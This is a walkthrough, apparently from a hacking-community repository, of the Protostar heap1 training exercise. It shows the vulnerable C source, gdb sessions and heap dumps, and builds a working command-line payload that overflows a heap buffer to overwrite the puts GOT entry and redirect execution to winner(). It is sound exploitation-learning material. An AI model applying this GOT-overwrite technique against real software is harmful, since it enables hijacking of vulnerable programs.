## GOT Overwrite
> overwriting global offset table via heap overflow  
:syringe: Learned and noted for everyone :syringe:

**:pill: heap1.c from protostar :pill:**

```clike
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {  
  int priority;
  char *name;
};

void winner()  
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)  
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

:scroll: :scroll: :scroll: Definitions of source code :scroll: :scroll: :scroll:   

 - `struct internet *i1, *i2, *i3;` -> program has 3 pointers
 - `i1->name` & `i2->name` are respectively allocated at heap memory with 8 bytes
 - user inputs are copying to `i1->name` & `i2->name`

:mag: :mag: :mag: Debugging in gdb :mag_right: :mag_right: :mag_right:
 - we will break at strcpy and then we will examine heap in gdb
 - `gdb -q ./heap1` -> load the program with gdb
 - `set disassembly-flavor intel` -> set disassembly result to intel
 - `disas main` -> disassemble main function to set a breakboint
 - `break *main+127` -> set breakpoint at first strcpy
 - `run` -> run program to know heap address
 - `info proc map`- > viewing heap address -> `0x804a000`

defining hook for better debugging

```
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/32x 0x804a000
>x/2i $eip
>end
```

 - `run AAAA BBBB` -> run program to examine heap chunks

:grey_question: results :grey_question:
```
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
``` 
**:notebook: Revisiting Heap Chunks :notebook:**

i1 heap chunk

    [ 0x00000000      0x00000011      0x00000001      0x0804a018 ]
    [ prev_size       chunk_size      i1->priority    i1->name   ]

 - `0x11 = 17 bytes` 
 - `0x0804a018` -> address of i1->name to store argv[1]

i2 heap chunk

    [ 0x00000000      0x00000011      0x00000002      0x0804a038 ]
    [ prev_size       chunk_size      i1->priority    i1->name   ]

 - `0x11 = 17 bytes` 
 - `0x0804a038` -> address of i2->name to store argv[2]

execute after strcpy

```
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
```
 - `0x41414141- AAAA` is stored in `0x0804a018` 
 - `0x42424242- BBBB` is stored in `0x0804a038` 
 - we have access to write at `0x0804a018` so we can overwrite `0x0804a038` , simple!
 - `run $(python -c 'print "A"*24') BBBB` -> test overflow

:grey_question: results :grey_question:

```
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
```

 - bingo! we can modify i2->name
 - if we can modify specific address, the only thing to do is overwriting global offest table
- `disas main` -> checking the program has function call from PLT ( procedure linkage table ) 
- `0x08048561 <main+168>:  call   0x80483cc <puts@plt>` -> this challenge has a call for puts

viewing the adreess in GOT

```
(gdb) x 0x80483cc
0x80483cc <puts@plt>:   jmp    DWORD PTR ds:0x8049774
(gdb) x 0x8049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:   rol    BYTE PTR [ebx+0x804],cl
```

 - `0x8049774` -> the address we need to overwrite
 - `0x0804a038 = \x38\xa0\x04\x08` -> the address of i2->name
 - `run $(python -c 'print "A"*20+"\x38\xa0\x04\x08"') BBBB` -> testing to modify

:grey_question: results :grey_question:

```
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x41414141      0x0804a038
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
```

 - its worked !  time to overwrite GOT address
 - `0x8049774 = \x74\x97\x04\x08` -> GOT address
 - `disas winner` -> view winner address
 - `0x08048494 = \x94\x84\x04\x08` -> winer address
 - `run $(python -c 'print "A"*20+"\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')` -> final payload

:grey_question: results :grey_question:

```
$ ./heap1 $(python -c 'print "A"*20+"\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
and we have a winner @ 1544380822
```
 - Yeah! we made it

Have fun! :v: :v: :v:

---
**:muscle: References :muscle:**  

all resources listed here :point_right: [LOL-Fav](http://location-href.com/lol-fav/)  :page_facing_up:

:snowman: Contributed and maintained by [Luna-](https://twitter.com/art0flunam00n)  
:snowflake: Powered by [Legion of LOL](http://location-href.com)

---

